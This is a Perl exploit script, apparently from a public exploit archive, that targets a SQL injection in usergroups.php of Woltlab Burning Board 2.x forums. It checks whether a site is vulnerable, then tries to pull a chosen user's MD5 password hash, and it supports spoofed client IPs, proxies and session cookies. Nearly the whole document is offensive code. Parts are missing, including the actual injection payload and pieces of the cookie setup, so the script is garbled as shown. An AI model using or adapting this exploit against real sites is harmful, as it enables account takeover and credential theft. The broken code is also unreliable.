Woltlab Burning Board 2.x (usergroups.php) Remote SQL Injection Exploit
=======================================================================




#!/usr/bin/perl

#    Woltlab Burning Board 2.X usergroups.php SQL Injection exploit - burned2.pl

#    written by x666 

#    jmp-esp.kicks-ass.net;blueshisha.chills.it

#    SR-CREW

#    should work on every wbb regardless of php settings.

#

#

use strict;

use warnings;

use LWP::UserAgent;

use HTTP::Response;

use HTTP::Status;

use Getopt::Std;

getopt(&#039;uiUpAcC&#039;);

our ( $opt_u, $opt_i, $opt_s, $opt_U, $opt_p, $opt_A, $opt_c, $opt_C );

my $target = shift;

sub do_request($$);

if ( !$target ) { &HELP_MESSAGE; }

if ( !$opt_U && !$opt_C) { &HELP_MESSAGE; }

my ( $host, $folder );



if ( $target =~ /(?:http:\/\/)?([\w\.\-\_]*)(\/.*)?/ ) {



   $host = $1;

   $folder = ( $2 ? $2 : &#039;/&#039; );

   if ( $folder !~ /\/$/ ) { $folder .= &#039;/&#039;; }

   $target = "http://$host$folder" . &#039;usergroups.php&#039;;

}

else { &HELP_MESSAGE; }



my $ip           = ( $opt_i ? $opt_i : &#039;127.0.0.1&#039; );

my ( $userid, $userpassword, $proxy, $proxyip );

( $userid, $userpassword ) = split( &#039;:&#039;, $opt_U ) if $opt_U;

( $proxy,  $proxyip )      = split( &#039;:&#039;, $opt_p ) if $opt_p;

my $uid = ( $opt_u ? $opt_u : 1 );

my $useragent =

 ( $opt_A ? $opt_A : &#039;Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9&#039; );


my $isHash = 0;



print "burned2.pl written by x666\n";

print "report errors \@ blueshisha\@safe-mail.net.. thx\n";

print "[x] Attacking $target...\n";



if ( $userpassword and $userpassword =~ /([a-f0-9]{32})/ ) { $isHash = 1; }







if ( !$opt_c ) {



my $headers = do_request( &#039;&#039;, &#039;&#039; );

if ( $headers =~ /Set-Cookie: (.*?)cookiehash/ ) {


     }

       else { print $headers}



   }








print "[x] Vulnerable check:";



my $answer;


$answer = do_request( &#039;\&#039;&#039;, &#039;&#039; );



if ( $answer =~ /FROM (.*?)_applications/ ) {


   print " Vulnerable\n";




}



elsif ($answer =~ /Ihnen wird der Zutritt zu dieser Seite/

   or $answer =~ /Access denied/ )

{

   print " No Idea\n";

   print "[x] usergroups.php only for users,";






   exit;

}

else {

   print " Not Vulnerable!\n";

       print $answer;

   exit;

}



print "[x] Unleashing black magic...\n";


$answer = do_request(


);



if ( $answer =~ /${folder}usergroups.php/ and $answer =~ /([a-f0-9]{32})/ ) {

   print "[x] Looks good!\n";

   print "[x] Userid: $uid\n";

   print "[x] Hash: $1\n";

   if ( !$opt_C ) {

       print


   }



}

else {

   print "[x] Looks bad!\n";

  print $answer;



}



sub HELP_MESSAGE() {

   print "burned2.pl written by x666\n"

     . "perl $0 [options] url\n"

     . "examples:\n"

     . "perl $0 -U 10:123456 woltlab.de/de/forum/\n"

     . "perl $0 -u 2 -i 127.0.0.2 -U 10:123456 woltlab.de/de/forum/\n"

     . "overwrite -c only when the auto-check "

     . "gives you a false result\n"

     . "use -C when you need some special cookies\n"

     . "options :\n-u userid of victim [1]\n"

     . "-i faked client-ip [127.0.0.1]\n"

     . "-U userid:password or userid:pwhash [none]\n"

     . "-p proxyip:proxyport [none]\n"

     . "-A user-agent [firefox 1.5.09]\n"


     . "-C raw cookie\n";


   exit;

}



sub do_request($$) {

   my $string   = shift;

   my $otherurl = shift;

   if ($otherurl) { $target = "http://$host$folder" . $otherurl; }

   else { $target = "http://$host$folder" . &#039;usergroups.php&#039; }

   $string = &#039;/*&#039; if ( !$string );

   my $ua = LWP::UserAgent->new;

   if ($proxy) { $ua->proxy( &#039;http&#039;, "http://$proxy:$proxyip/" ); }

   my $request = new HTTP::Request( &#039;POST&#039;, $target );

   $request->content( &#039;applicationids%5B0)&#039; . $string . &#039;%5D=1&#039;

         . &#039;&action=groupleaders_deleteapplications&#039;);

   $request->authorization_basic(&#039;projectb&#039;, &#039;neustart&#039;);

   $request->content_type(&#039;application/x-www-form-urlencoded&#039;);

   $request->header( &#039;User-Agent&#039; => $useragent );



   if ($opt_U) {

       my $userhash;

       if ( !$isHash ) { $userhash = md5($userpassword); }

       else { $userhash = $userpassword; }


         . &#039;userid=&#039;

         . $userid . &#039;;&#039;


         . &#039;userpassword=&#039;

         . $userhash;



       $request->header( &#039;Cookie&#039; => $cookie );

   }

   elsif ($opt_C) {

       $request->header( &#039;Cookie&#039; => $opt_C );

       $userid=3265;
   }

   $request->header( &#039;Client-Ip&#039; => $ip );

   my $response = $ua->request($request);

   my $body     = $response->content;

   my $headers  = $response->headers_as_string;



   $body = $response->error_as_HTML if ( $response->is_error );



   return $headers if ( $string eq &#039;/*&#039; and !$response->is_error );

   return $body;

}



# MD5 Code ripped from Libwhisker for bigger portability

# thx rfp :)

{

   my ( @S, @T, @M );

   my $code = &#039;&#039;;



   sub md5 {

       return undef if ( !defined $_[0] );    # oops, forgot the data

       my $DATA = _md5_pad( $_[0] );

       &_md5_init() if ( !defined $M[0] );

       return _md5_perl_generated( \$DATA );

   }



   sub _md5_init {

       return if ( defined $S[0] );

       my $i;

       for ( $i = 1 ; $i <= 64 ; $i++ ) {

           $T[ $i - 1 ] = int( ( 2**32 ) * abs( sin($i) ) );

       }

       my @t = ( 7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21 );

       for ( $i = 0 ; $i < 64 ; $i++ ) {

           $S[$i] = $t[ ( int( $i / 16 ) * 4 ) + ( $i % 4 ) ];

       }

       @M = (

           0, 1, 2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14, 15,

           1, 6, 11, 0,  5,  10, 15, 4,  9,  14, 3,  8,  13, 2,  7,  12,

           5, 8, 11, 14, 1,  4,  7,  10, 13, 0,  3,  6,  9,  12, 15, 2,

           0, 7, 14, 5,  12, 3,  10, 1,  8,  15, 6,  13, 4,  11, 2,  9

       );

       &_md5_generate();

       my $TEST = _md5_pad(&#039;foobar&#039;);



       if ( _md5_perl_generated( \$TEST ) ne

           &#039;3858f62230ac3c915f300c664312c63f&#039; )

       {

           die(&#039;Error: MD5 self-test not successful.&#039;);

       }

   }



   sub _md5_pad {

       my $l = length( my $msg = shift() . chr(128) );

       $msg .= "\0" x ( ( $l % 64 <= 56 ? 56 : 120 ) - $l % 64 );

       $l = ( $l - 1 ) * 8;

       $msg .= pack &#039;VV&#039;, $l & 0xffffffff, ( $l >> 16 >> 16 );

       return $msg;

   }



   sub _md5_generate {

       my $N = &#039;abcddabccdabbcda&#039;;

       my ( $i, $M ) = ( 0, &#039;&#039; );

       $M    = &#039;&0xffffffff&#039; if ( ( 1 << 16 ) << 16 ); # mask for 64bit systems

       $code = <<EOT;

       sub _md5_perl_generated {

   BEGIN { \$^H |= 1; }; # use integer

       my (\$A,\$B,\$C,\$D)=(0x67452301,0xefcdab89,0x98badcfe,0x10325476);

       my (\$a,\$b,\$c,\$d,\$t,\$i);

       my \$dr=shift;

       my \$l=length(\$\$dr);

       for my \$L (0 .. ((\$l/64)-1) ) {

               my \@D = unpack(&#039;V16&#039;, substr(\$\$dr, \$L*64,64));

               (\$a,\$b,\$c,\$d)=(\$A,\$B,\$C,\$D);

EOT

       for ( $i = 0 ; $i < 16 ; $i++ ) {

           my ( $a, $b, $c, $d ) =

             split( &#039;&#039;, substr( $N, ( $i % 4 ) * 4, 4 ) );

           $code .=

             "\$t=((\$$d^(\$$b\&(\$$c^\$$d)))+\$$a+\$D[$M[$i]]+$T[$i])$M;\n";

           $code .=

"\$$a=(((\$t<<$S[$i])|((\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\$$b)$M;\n";

       }

       for ( ; $i < 32 ; $i++ ) {

           my ( $a, $b, $c, $d ) =

             split( &#039;&#039;, substr( $N, ( $i % 4 ) * 4, 4 ) );

           $code .=

             "\$t=((\$$c^(\$$d\&(\$$b^\$$c)))+\$$a+\$D[$M[$i]]+$T[$i])$M;\n";

           $code .=

"\$$a=(((\$t<<$S[$i])|((\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\$$b)$M;\n";

       }

       for ( ; $i < 48 ; $i++ ) {

           my ( $a, $b, $c, $d ) =

             split( &#039;&#039;, substr( $N, ( $i % 4 ) * 4, 4 ) );

           $code .= "\$t=((\$$b^\$$c^\$$d)+\$$a+\$D[$M[$i]]+$T[$i])$M;\n";

           $code .=

"\$$a=(((\$t<<$S[$i])|((\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\$$b)$M;\n";

       }

       for ( ; $i < 64 ; $i++ ) {

           my ( $a, $b, $c, $d ) =

             split( &#039;&#039;, substr( $N, ( $i % 4 ) * 4, 4 ) );

           $code .= "\$t=((\$$c^(\$$b|(~\$$d)))+\$$a+\$D[$M[$i]]+$T[$i])$M;\n";

           $code .=

"\$$a=(((\$t<<$S[$i])|((\$t>>(32-$S[$i]))&((1<<$S[$i])-1)))+\$$b)$M;\n";

       }

       $code .= <<EOT;

               \$A=\$A+\$a\&0xffffffff; \$B=\$B+\$b\&0xffffffff;

               \$C=\$C+\$c\&0xffffffff; \$D=\$D+\$d\&0xffffffff;

       } # for

   return unpack(&#039;H*&#039;, pack(&#039;V4&#039;,\$A,\$B,\$C,\$D)); }

EOT

       eval "$code";

   }

}    # md5 package container




